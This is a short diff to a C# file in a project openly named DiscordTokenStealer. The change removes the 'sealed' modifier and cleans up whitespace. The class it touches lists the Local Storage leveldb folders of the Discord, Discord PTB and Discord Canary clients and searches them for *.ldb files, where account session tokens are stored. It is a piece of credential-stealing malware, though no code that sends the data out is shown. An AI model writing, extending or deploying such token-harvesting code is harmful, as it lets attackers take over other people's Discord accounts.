@@ -2,7 +2,7 @@
 
 namespace DiscordTokenStealer.DirectorySearchProviders;
 
-public sealed partial class AppDataSearchProvider : IDirectorySearchProvider
+public partial class AppDataSearchProvider : IDirectorySearchProvider
 {
     private AppDataSearchProvider(string directory, string searchPattern = "*.ldb")
     {
@@ -14,14 +14,14 @@ public sealed partial class AppDataSearchProvider : IDirectorySearchProvider
     public string Pattern { get; }
 }
 
-public sealed partial class AppDataSearchProvider
+public partial class AppDataSearchProvider
 {
     #region Discord Clients
-    
+
     public static readonly AppDataSearchProvider Discord = new("discord\\Local Storage\\leveldb");
-    
+
     public static readonly AppDataSearchProvider DiscordPtb = new("discordptb\\Local Storage\\leveldb");
-    
+
     public static readonly AppDataSearchProvider DiscordCanary = new("discordcanary\\Local Storage\\leveldb");
 
     #endregion
